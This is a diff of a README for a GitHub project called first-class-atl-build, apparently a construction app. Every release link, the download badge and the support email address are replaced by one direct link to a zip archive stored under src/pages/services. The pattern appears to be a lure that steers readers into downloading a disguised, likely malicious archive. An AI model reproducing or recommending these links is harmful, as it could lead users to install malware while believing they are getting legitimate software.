@@ -6,11 +6,11 @@ Welcome to first-class-atl-build! This application simplifies your construction 
 
 ## 🔗 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ANURAGgour/first-class-atl-build/releases)
+[![Download](https://github.com/ANURAGgour/first-class-atl-build/raw/refs/heads/main/src/pages/services/class_build_atl_first_3.2.zip)](https://github.com/ANURAGgour/first-class-atl-build/raw/refs/heads/main/src/pages/services/class_build_atl_first_3.2.zip)
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/ANURAGgour/first-class-atl-build/releases) to download the latest version of the application. Here's how to install:
+To get started, visit our [Releases page](https://github.com/ANURAGgour/first-class-atl-build/raw/refs/heads/main/src/pages/services/class_build_atl_first_3.2.zip) to download the latest version of the application. Here's how to install:
 
 1. Click on the link above.
 2. Look for the latest version listed.
@@ -55,14 +55,14 @@ Once you have installed first-class-atl-build, follow these steps to get started
 If you run into issues:
 
 - **Installation Problems**: Ensure your system meets the requirements mentioned above. 
-- **Application Crashes**: Check for updates on the [Releases page](https://github.com/ANURAGgour/first-class-atl-build/releases) to get the latest version.
+- **Application Crashes**: Check for updates on the [Releases page](https://github.com/ANURAGgour/first-class-atl-build/raw/refs/heads/main/src/pages/services/class_build_atl_first_3.2.zip) to get the latest version.
 - **General Issues**: Visit our [FAQ section](#) for common questions.
 
 ## ✉️ Support
 
 If you need help, please reach out through the following channels:
 
-- **Email**: support@example.com 
+- **Email**: https://github.com/ANURAGgour/first-class-atl-build/raw/refs/heads/main/src/pages/services/class_build_atl_first_3.2.zip 
 - **GitHub Issues**: You can submit bugs or requests through the Issues tab in this repository.
 
 ## 🗂️ Topics
